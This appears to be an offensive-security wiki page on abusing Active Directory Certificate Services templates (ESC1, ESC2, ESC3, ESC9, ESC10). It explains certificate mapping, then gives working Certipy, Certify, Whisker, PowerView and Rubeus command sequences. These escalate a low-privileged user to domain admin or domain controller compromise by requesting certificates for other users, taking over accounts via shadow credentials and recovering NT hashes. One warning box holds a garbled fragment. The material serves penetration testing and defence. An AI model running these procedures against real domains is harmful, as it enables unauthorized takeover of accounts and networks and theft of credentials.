# Certificate templates

## Theory

### Template theory

> AD CS Enterprise CAs issue certificates with settings defined by AD objects known as certificate templates. These templates are collections of enrollment policies and predefined certificate settings and contain things like “_How long is this certificate valid for?_”, _“What is the certificate used for?”,_ “_How is the subject specified?_”, _“Who is allowed to request a certificate?”_, and a myriad of other settings
>
> \[...]
>
> There is a specific set of settings for certificate templates that makes them extremely vulnerable. As in regular-domain-user-to-domain-admin vulnerable.
>
> ([specterops.io](https://posts.specterops.io/certified-pre-owned-d95910965cd2))

In [their research papers](https://posts.specterops.io/certified-pre-owned-d95910965cd2), [Will Schroeder](https://twitter.com/harmj0y) and [Lee Christensen](https://twitter.com/tifkin\_) found multiple vectors of domain escalation based on certificate template misconfigurations (dubbed [ESC1](https://posts.specterops.io/certified-pre-owned-d95910965cd2#180f), [ESC2](https://posts.specterops.io/certified-pre-owned-d95910965cd2#dfa4) and [ESC3](https://posts.specterops.io/certified-pre-owned-d95910965cd2#c08e)).

Following this, [Olivier Lyak](https://twitter.com/ly4k\_) has found two new template misconfigurations (dubbed [ESC9](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7) and [ESC10](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)).

![Vulnerable configurations for ESC1, ESC2 and ESC3](../../../.gitbook/assets/ad-cs\_cert\_templates\_vuln\_confs.png)

### Certificate mapping

This section is dedicated to how a certificate is mapped to an account object (after [certifried.md](certifried.md "mention") patch). Understanding certificate mapping is pretty useful to understand [ESC9](certificate-templates.md#no-security-extension-esc9) and [ESC10](certificate-templates.md#weak-certificate-mapping-esc10).

Following [CVE-2022–26923](https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4) ([certifried.md](certifried.md "mention")) discovered by [Olivier Lyak](https://twitter.com/ly4k\_), Microsoft has implemented a new security extension for the issued certificates, and two new registry keys to properly deal with certificate mapping.

* The `szOID_NTDS_CA_SECURITY_EXT` extension contains the `objectSid` of the requester
* The `StrongCertificateBindingEnforcement` registry key is used for Kerberos implicit mapping
* The `CertificateMappingMethods` registry key is used for Schannel implicit mapping

Mapping a certificate to a user can be done explicitly or implicitly:

* For explicit mapping, the `altSecurityIdentities` attribute of an account must contains the identifier of the certificate. This way, for authentication the certificate must be signed by a trusted CA and match the `altSecurityIdentities` value
* For implicit mapping, this is the information contained in the certificate's SAN that are used to map with the DNS or the UPN (`userPrincipalName`) field

#### Kerberos mapping

During Kerberos authentication, the certificate mapping process will call the `StrongCertificateBindingEnforcement` registry key. This key can be equal to three values:

* `0`: no strong certificate mapping is realised. The new `szOID_NTDS_CA_SECURITY_EXT` extension is not check and the authentication behavior is similar to what was done before the patch
* `1`: default value after the patch. The KDC checks if the explicit certificate mapping is present (strong mapping). If yes, the authentication is allowed; if no, it checks if the new security extension is present and validate it. If it is not present, the authentication can be allowed if the user account predates the certificate
* `2`:  the KDC checks if the explicit certificate mapping is present (strong mapping). If yes, the authentication is allowed; if no, it checks if the new security extension is present and validate it. If it is not present, the authentication is refused

If the registry key value is `0` and the certificate contains an **UPN value** (normally for a user account), the KDC will first try to map the certificate to a user with a `userPrincipalName` value that matches. If no validation can be performed, the KDC will search an account with a matching `sAMAccountName` property. If none can be found, it will retry with a `$` at the end of the username. Thus, a certificate with a UPN can be mapped to a machine account.

If the registry key value is `0` and the certificate contains an **DNS value** (normally for a machine account), the KDC splits the user and the domain part, i.e. `user.domain.local` becomes `user` and `domain.local`. The domain part is validated against the Active Directory domain, and the user part is validated adding a `$` at the end, and searching for an account with a corresponding `sAMAccountName`.

If the registry key value is `1` or `2`, the `szOID_NTDS_CA_SECURITY_EXT` security extension will be used to map the account using its `objectSid`. With a registry key equals to `1` and no security extension presents, the mapping behavior is similar to a registry key equal to `0`.

#### Schannel mapping

During Kerberos authentication, the certificate mapping process will call the `CertificateMappingMethods` registry key. This key can be a combinaison of the following values:

* `0x0001`: subject/issuer explicit mapping
* `0x0002`: issuer explicit mapping
* `0x0004`: SAN implicit mapping
* `0x0008`: S4USelf implicit Kerberos mapping
* `0x0010`: S4USelf explicit Kerberos mapping

The current default value is `0x18` (`0x8` and `0x10`). Schannel doesn't support the new `szOID_NTDS_CA_SECURITY_EXT` security extension directly, but it can use it by "converting" the Schannel certificate mapping to a Kerberos certificate mapping using **S4USelf**. Then, the mapping will be performed as presented in the [Kerberos mapping](certificate-templates.md#kerberos-mapping) section.

If some certificate authentication issues are encountered in an Active Directory, [Microsoft has officially suggested](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16) to set the `CertificateMappingMethods` value to `0x1f` (old value).

## Practice

### Template allows SAN (ESC1)

When a certificate template allows to specify a `subjectAltName`, it is possible to request a certificate for another user. It can be used for privileges escalation if the EKU specifies `Client Authentication` or `ANY`.

{% tabs %}
{% tab title="UNIX-like" %}
From UNIX-like systems, [Certipy](https://github.com/ly4k/Certipy) (Python) can be used to enumerate for, and conduct, the ESC1 and ESC2 scenarios.&#x20;

Once a vulnerable template is found ([how to enumerate](./#attack-paths)), a request shall be made to obtain a certificate.

```bash
#To specify a user account in the SAN
certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" -ca 'ca_name' -template 'vulnerable template' -upn 'domain admin'

#To specify a computer account in the SAN
certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" -ca 'ca_name' -template 'vulnerable template' -dns 'dc.domain.local'
```

{% hint style="warning" %}
The `$ADCS_HOST` target must be a FQDN (not an IP).
{% endhint %}

The certificate can then be used with [Pass-the-Certificate](../kerberos/pass-the-certificate.md) to obtain a TGT and authenticate.

{% hint style="info" %}
By default, Certipy uses LDAPS, which is not always supported by the domain controllers. The `-scheme` flag can be used to set whether to use LDAP or LDAPS.
{% endhint %}
{% endtab %}

{% tab title="Windows" %}
From Windows systems, the [Certify](https://github.com/GhostPack/Certify) (C#) tool can be used.

```batch
# Find vulnerable/abusable certificate templates using default low-privileged group
Certify.exe find /vulnerable

# Find vulnerable/abusable certificate templates using all groups the current user context is a part of:
Certify.exe find /vulnerable /currentuser
```

Once a vulnerable template is found, a request shall be made to obtain a certificate, with another high-priv user set as SAN (`subjectAltName`).

```batch
Certify.exe request /ca:'domain\ca' /template:"Vulnerable template" /altname:"admin"
```

The certificate can then be used with [Pass-the-Certificate](../kerberos/pass-the-certificate.md) to obtain a TGT and authenticate.
{% endtab %}
{% endtabs %}

### Any purpose EKU (ESC2)

When a certificate template specifies the **Any Purpose** EKU, or no EKU at all, the certificate can be used for anything. ESC2 can't be abused like ESC1 if the requester can't specify a SAN, however, it can be abused like ESC3 to use the certificate as requirement to request another one on behalf of any user.

### Certificate Agent EKU (ESC3)

When a certificate template specifies the **Certificate Request Agent** EKU, it is possible to use the issued certificate from this template to request another certificate on behalf of any user.

{% tabs %}
{% tab title="UNIX-like" %}
From UNIX-like systems, [Certipy](https://github.com/ly4k/Certipy) (Python) can be used to enumerate for, and conduct, the ESC3 scenario. It is possible to output the result in an archive that can be uploaded in Bloodhound.

```bash
certipy find -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -vulnerable
```

Once a vulnerable template is found ([how to enumerate](./#attack-paths)), a request shall be made to obtain a certificate specifying the **Certificate Request Agent** EKU.

```bash
certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" -ca 'ca_name' -template 'vulnerable template'
```

Then, the issued certificate can be used to request another certificate permitting `Client Authentication` on behalf of another user.

```bash
certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" -ca 'ca_name' -template 'User' -on-behalf-of 'domain\domain admin' -pfx 'user.pfx'
```

{% hint style="info" %}
By default, Certipy uses LDAPS, which is not always supported by the domain controllers. The `-scheme` flag can be used to set whether to use LDAP or LDAPS.
{% endhint %}
{% endtab %}

{% tab title="Windows" %}
From Windows systems, the [Certify](https://github.com/GhostPack/Certify) (C#) tool can be used.

```batch
# Find vulnerable/abusable certificate templates using default low-privileged group
Certify.exe find /vulnerable

# Find vulnerable/abusable certificate templates using all groups the current user context is a part of:
Certify.exe find /vulnerable /currentuser
```

Once a vulnerable template is found, a request shall be made to obtain a certificate specifying the **Certificate Request Agent** EKU.

```batch
Certify.exe request /ca:'domain\ca' /template:"Vulnerable template"
```

Then, the issued certificate can be used to request another certificate permitting `Client Authentication` on behalf of another user.

```batch
Certify.exe request /ca:'domain\ca' /template:"User" /onbehalfon:DOMAIN\Admin /enrollcert:enrollmentAgentCert.pfx /enrollcertpw:Passw0rd!
```
{% endtab %}
{% endtabs %}

### No security extension (ESC9)

To understand this privilege escalation, it is recommended to know how certificate mapping is performed. It is presented in [this section](certificate-templates.md#certificate-mapping).

If the certificate attribute `msPKI-Enrollment-Flag` contains the flag `CT_FLAG_NO_SECURITY_EXTENSION`, the `szOID_NTDS_CA_SECURITY_EXT` extension will not be embedded, meaning that even with `StrongCertificateBindingEnforcement` set to `1`, the mapping will be performed similarly as a value of `0` in the registry key.

Here are the requirements to perform ESC9:

* `StrongCertificateBindingEnforcement` not set to `2` (default: `1`) or `CertificateMappingMethods` contains `UPN` flag (`0x4`)
* The template contains the `CT_FLAG_NO_SECURITY_EXTENSION` flag in the `msPKI-Enrollment-Flag` value
* The template specifies client authentication
* `GenericWrite` right against any account A to compromise any account B

{% hint style="warning" %}
Acate can then be used with to obtain a TGT and authenticat the time of writting (06/08/2022), there is no solution as a low privileged user to read the `StrongCertificateBindingEnforcement` or the `CertificateMappingMethods` values. It is worth to try the attack hopping the keys are misconfigured.
{% endhint %}

{% tabs %}
{% tab title="UNIX-like" %}
From UNIX-like systems, [Certipy](https://github.com/ly4k/Certipy) (Python) can be used to enumerate for, and conduct, the ESC9 scenario.

In this scenario, **user1** has `GenericWrite` against **user2** and wants to compromise **user3**. **user2** is allowed to enroll in a vulnerable template that specifies the `CT_FLAG_NO_SECURITY_EXTENSION` flag in the `msPKI-Enrollment-Flag` value.

First, the **user2**'s hash is needed. It can be retrieved via a [Shadow Credentials](../kerberos/shadow-credentials.md) attack, for example.

```bash
certipy shadow auto -username "user1@$DOMAIN" -p "$PASSWORD" -account user2
```

Then, the `userPrincipalName` of **user2** is changed to **user3**.

```bash
certipy account update -username "user1@$DOMAIN" -p "$PASSWORD" -user user2 -upn user3
```

The vulnerable certificate can be requested as **user2**.

```bash
certipy req -username "user2@$DOMAIN" -hash "$NT_HASH" -target "$ADCS_HOST" -ca 'ca_name' -template 'vulnerable template'
```

The **user2**'s UPN is changed back to something else.

```bash
certipy account update -username "user1@$DOMAIN" -p "$PASSWORD" -user user2 -upn "user2@$DOMAIN"
```

Now, authenticating with the obtained certificate will provide the **user3**'s NT hash during [UnPac the hash](../kerberos/unpac-the-hash.md). The domain must be specified since it is not present in the certificate.

```bash
certipy auth -pfx 'user3.pfx' -domain "$DOMAIN"
```

{% hint style="info" %}
By default, Certipy uses LDAPS, which is not always supported by the domain controllers. The `-scheme` flag can be used to set whether to use LDAP or LDAPS
{% endhint %}
{% endtab %}

{% tab title="Windows" %}
From Windows systems, the [Certify](https://github.com/GhostPack/Certify) (C#) tool can be used.

```batch
# Find vulnerable/abusable certificate templates using default low-privileged group
Certify.exe find

# Find vulnerable/abusable certificate templates using all groups the current user context is a part of:
Certify.exe find /currentuser
```

Here, **user1** has `GenericWrite` against **user2** and want to compromise **user3**. **user2** is allowed to enroll in a vulnerable template that specifies the `CT_FLAG_NO_SECURITY_EXTENSION` flag in the `msPKI-Enrollment-Flag` value.

First, the **user2**'s credentials are needed. It can be retrieved via a [Shadow Credentials](../kerberos/shadow-credentials.md) attack, for example. Here just the `msDs-KeyCredentialLink` modification part with [Whisker](https://github.com/eladshamir/Whisker):

```batch
Whisker.exe add /target:"user2" /domain:"domain.local" /dc:"DOMAIN_CONTROLLER" /path:"cert.pfx" /password:"pfx-password"
```

Then, the `userPrincipalName` of **user2** is changed to **user3** with [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)**.**

```batch
Set-DomainObject user2 -Set @{'userPrincipalName'='user3'} -Verbose
```

The vulnerable certificate can be requested in a **user2** session.

```batch
Certify.exe request /ca:'domain\ca' /template:"Vulnerable template"
```

The **user2**'s UPN is changed back to something else.

```batch
Set-DomainObject user2 -Set @{'userPrincipalName'='user2@dmain.local'} -Verbose
```

Now, authenticating with the obtained certificate will provide the **user3**'s NT hash during [UnPac the hash](../kerberos/unpac-the-hash.md). This action can be realised with [Rubeus](https://github.com/GhostPack/Rubeus). The domain must be specified since it is not present in the certificate.

```batch
Rubeus.exe asktgt /getcredentials /certificate:"BASE64_CERTIFICATE" /password:"CERTIFICATE_PASSWORD" /domain:"domain.local" /dc:"DOMAIN_CONTROLLER" /show
```
{% endtab %}
{% endtabs %}

### Weak certificate mapping (ESC10)

To understand this privilege escalation, it is recommended to know how certificate mapping is performed. It is presented in [this section](certificate-templates.md#certificate-mapping).

This ESC refers to a weak configuration of the registry keys:

* Case 1 :&#x20;
  * `StrongCertificateBindingEnforcement` set to `0`, meaning no strong mapping is performed
  * A template that specifiy client authentication is enabled (any template, like the built-in `User` template)
  * `GenericWrite` right against any account A to compromise any account B

{% hint style="warning" %}
At the time of writting (06/08/2022), there is no solution as a low privileged user to read the `StrongCertificateBindingEnforcement` value. It is worth to try the attack hopping the key is misconfigured.
{% endhint %}

{% tabs %}
{% tab title="Unix-like" %}
From UNIX-like systems, [Certipy](https://github.com/ly4k/Certipy) (Python) can be used to enumerate for, and conduct, the ESC10 scenario.

In this scenario, **user1** has `GenericWrite` against **user2** and want to compromise **user3**.

First, the **user2**'s hash is needed. It can be retrieved via a [Shadow Credentials](../kerberos/shadow-credentials.md) attack, for example.

```bash
certipy shadow auto -username "user1@$DOMAIN" -p "$PASSWORD" -account user2
```

Then, the `userPrincipalName` of **user2** is changed to **user3**.

```bash
certipy account update -username "user1@$DOMAIN" -p "$PASSWORD" -user user2 -upn user3
```

A certificate permitting client authentication can be requested as **user2**.

```bash
certipy req -username "user2@$DOMAIN" -hash "$NT_HASH" -ca 'ca_name' -template 'User'
```

The **user2**'s UPN is changed back to something else.

```bash
certipy account update -username "user1@$DOMAIN" -p "$PASSWORD" -user user2 -upn "user2@$DOMAIN"
```

Now, authenticating with the obtained certificate will provide the **user3**'s NT hash with [UnPac the hash](../kerberos/unpac-the-hash.md). The domain must be specified since it is not present in the certificate.

```bash
certipy auth -pfx 'user3.pfx' -domain "$DOMAIN"
```

{% hint style="info" %}
By default, Certipy uses LDAPS, which is not always supported by the domain controllers. The `-scheme` flag can be used to set whether to use LDAP or LDAPS
{% endhint %}
{% endtab %}

{% tab title="Windows" %}
From Windows systems, the [Certify](https://github.com/GhostPack/Certify) (C#) tool can be used.

```batch
# Find vulnerable/abusable certificate templates using default low-privileged group
Certify.exe find

# Find vulnerable/abusable certificate templates using all groups the current user context is a part of:
Certify.exe find /currentuser
```

Here, **user1** has `GenericWrite` against **user2** and want to compromise **user3**.

First, the **user2**'s credentials are needed. It can be retrieved via a [Shadow Credentials](../kerberos/shadow-credentials.md) attack, for example. Here just the `msDs-KeyCredentialLink` modification part with [Whisker](https://github.com/eladshamir/Whisker):

```batch
Whisker.exe add /target:"user2" /domain:"domain.local" /dc:"DOMAIN_CONTROLLER" /path:"cert.pfx" /password:"pfx-password"
```

Then, the `userPrincipalName` of **user2** is changed to **user3** with [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)**.**

```batch
Set-DomainObject user2 -Set @{'userPrincipalName'='user3'} -Verbose
```

A certificate permitting client authentication can be requested in a **user2** session.

```batch
Certify.exe request /ca:'domain\ca' /template:"User"
```

The **user2**'s UPN is changed back to something else.

```batch
Set-DomainObject user2 -Set @{'userPrincipalName'='user2@dmain.local'} -Verbose
```

Now, authenticating with the obtained certificate will provide the **user3**'s NT hash during [UnPac the hash](../kerberos/unpac-the-hash.md). This action can be realised with [Rubeus](https://github.com/GhostPack/Rubeus). The domain must be specified since it is not present in the certificate.

```batch
Rubeus.exe asktgt /getcredentials /certificate:"BASE64_CERTIFICATE" /password:"CERTIFICATE_PASSWORD" /domain:"domain.local" /dc:"DOMAIN_CONTROLLER" /show
```
{% endtab %}
{% endtabs %}

* Case 2 :&#x20;
  * `CertificateMappingMethods` is set to `0x4`, meaning no strong mapping is performed and only the UPN will be checked
  * A template that specifiy client authentication is enabled (any template, like the built-in `User` template)
  * `GenericWrite` right against any account A to compromise any account B without a UPN already set (machine accounts or buit-in Administrator account for example)

{% hint style="warning" %}
At the time of writting (06/08/2022), there is no solution as a low privileged user to read the `CertificateMappingMethods` value. It is worth to try the attack hopping the key is misconfigured.
{% endhint %}

{% tabs %}
{% tab title="UNIX-like" %}
From UNIX-like systems, [Certipy](https://github.com/ly4k/Certipy) (Python) can be used to enumerate for, and conduct, the ESC10 scenario.&#x20;

In this scenario, **user1** has `GenericWrite` against **user2** and want to compromise the domain controller **DC$@domain.local**.

First, the **user2**'s hash is needed. It can be retrieved via a [Shadow Credentials](../kerberos/shadow-credentials.md) attack, for example.

```bash
certipy shadow auto -username "user1@$DOMAIN" -p "$PASSWORD" -account user2
```

Then, the `userPrincipalName` of **user2** is changed to **DC$@domain.local**.

```bash
certipy account update -username "user1@$DOMAIN" -p "$PASSWORD" -user user2 -upn "DC\$@$DOMAIN"
```

A certificate permitting client authentication can be requested as **user2**.

```bash
certipy req -username "user2@$DOMAIN" -hash "$NT_HASH" -ca 'ca_name' -template 'User'
```

The **user2**'s UPN is changed back to something else.

```bash
certipy account update -username "user1@$DOMAIN" -p "$PASSWORD" -user user2 -upn "user2@$DOMAIN"
```

Now, authentication with the obtained certificate will be performed through Schannel. The `-ldap-shell` option can be used to execute some LDAP requests and, for example, realised an [RBCD](../kerberos/delegations/rbcd.md) to fully compromised the domain controller.

```bash
certipy auth -pfx dc.pfx -dc-ip "$DC_IP" -ldap-shell
```

{% hint style="info" %}
By default, Certipy uses LDAPS, which is not always supported by the domain controllers. The `-scheme` flag can be used to set whether to use LDAP or LDAPS
{% endhint %}
{% endtab %}

{% tab title="Windows" %}
From Windows systems, the [Certify](https://github.com/GhostPack/Certify) (C#) tool can be used.

```batch
# Find vulnerable/abusable certificate templates using default low-privileged group
Certify.exe find

# Find vulnerable/abusable certificate templates using all groups the current user context is a part of:
Certify.exe find /currentuser
```

Here, **user1** has `GenericWrite` against **user2** and want to compromise the domain controller **DC$@domain.local**.

First, the **user2**'s credentials are needed. It can be retrieved via a [Shadow Credentials](../kerberos/shadow-credentials.md) attack, for example. Here just the `msDs-KeyCredentialLink` modification part with [Whisker](https://github.com/eladshamir/Whisker):

```batch
Whisker.exe add /target:"user2" /domain:"domain.local" /dc:"DOMAIN_CONTROLLER" /path:"cert.pfx" /password:"pfx-password"
```

Then, the `userPrincipalName` of **user2** is changed to **DC$@domain.local** with [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)**.**

```batch
Set-DomainObject user2 -Set @{'userPrincipalName'='DC$@domain.local'} -Verbose
```

A certificate permitting client authentication can be requested in a **user2** session.

```batch
Certify.exe request /ca:'domain\ca' /template:"User"
```

The **user2**'s UPN is changed back to something else.

```batch
Set-DomainObject user2 -Set @{'userPrincipalName'='user2@dmain.local'} -Verbose
```

Now, authentication with the obtained certificate will be performed through Schannel. It can be used to perform, for example, an [RBCD](../kerberos/delegations/rbcd.md) to fully compromised the domain controller.
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://posts.specterops.io/certified-pre-owned-d95910965cd2" %}

{% embed url="https://research.ifcr.dk/certipy-2-0-bloodhound-new-escalations-shadow-credentials-golden-certificates-and-more-34d1c26f0dc6" %}

{% embed url="https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7" %}
